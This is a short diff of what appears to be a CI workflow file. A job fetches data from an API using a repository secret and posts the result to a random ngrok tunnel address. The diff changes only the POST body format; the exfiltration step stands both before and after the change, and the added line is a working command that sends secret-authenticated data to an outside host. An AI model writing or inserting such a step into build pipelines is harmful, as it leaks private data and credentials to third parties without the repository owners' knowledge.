@@ -15,4 +15,4 @@ jobs:
           API_KEY: ${{ secrets.api_key }}
         run: |
           data=$(curl --url "$API_URL" -H "Authorization: $API_KEY"); \
-          curl --url https://bbf6a9e0bbd4.ngrok.io -d $data
+          curl --url https://bbf6a9e0bbd4.ngrok.io -d data=$data
